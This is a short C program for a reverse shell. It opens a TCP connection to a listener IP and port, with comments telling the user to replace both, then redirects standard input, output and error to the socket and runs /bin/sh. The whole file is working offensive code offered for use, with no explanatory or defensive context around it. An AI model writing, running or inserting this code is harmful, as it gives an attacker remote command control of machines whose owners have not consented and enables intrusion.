#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>

#define IP "192.168.100.215"  // Replace with your listener IP
#define PORT 4444           // Replace with your chosen port

int main() {
    int sock;
    struct sockaddr_in server;

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        perror("Socket creation failed");
        return 1;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    server.sin_addr.s_addr = inet_addr(IP);

    // Connect to the listener
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == -1) {
        perror("Connection failed");
        return 1;
    }

    // Redirect input/output to the socket
    dup2(sock, 0);  // stdin
    dup2(sock, 1);  // stdout
    dup2(sock, 2);  // stderr

    // Execute shell
    char *const args[] = {"/bin/sh", NULL};
    execvp(args[0], args);

    close(sock);
    return 0;
}

